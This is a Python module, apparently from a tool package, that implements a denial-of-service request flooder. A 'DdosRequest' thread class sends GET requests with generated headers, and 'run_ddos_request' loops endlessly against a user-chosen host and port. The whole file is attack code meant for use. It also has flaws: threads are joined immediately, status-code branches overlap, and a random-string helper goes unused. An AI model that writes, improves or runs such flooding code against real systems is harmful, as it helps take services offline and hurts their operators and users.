import random
import string
from cerber.ddfu.src.common import header_service
from requests import request as req
import threading
from print_color import print


class DdosRequest(threading.Thread):
    target = ''

    def __init__(self, target: str, port: int = None):
        threading.Thread.__init__(self)
        self.target = target
        self.ssl = False
        self.req = []
        self.lock = threading.Lock()
        self.port = port

    @staticmethod
    def rand_str():
        my_str = []
        for x in range(3):
            chars = tuple(string.ascii_letters + string.digits)
            text = (random.choice(chars) for _ in range(random.randint(7, 14)))
            text = ''.join(text)
            my_str.append(text)
        return '&'.join(my_str)

    def run(self):
        port = f':{self.port}' if self.port else ''
        url = f'{self.target}{port}'

        try:
            res = req(
                method='GET',
                url=url,
                headers=header_service.header(self.target)
            )
            if res.status_code < 300:
                print(url, color='c', tag_color='g', tag=f"{res.status_code}")
            if 300 < res.status_code < 400:
                print(url, color='w', tag_color='y', tag=f"{res.status_code}")
            else:
                print(url, color='w', tag_color='r', tag=f"{res.status_code}")

        except Exception as e:
            print(e)
            pass


def run_ddos_request(host: str, port: int, user_thread: int):
    threads = []
    while True:
        try:
            for x in range(int(user_thread)):
                t = DdosRequest(target=host, port=port)
                t.start()
                t.join()
        except KeyboardInterrupt:
            exit(101)
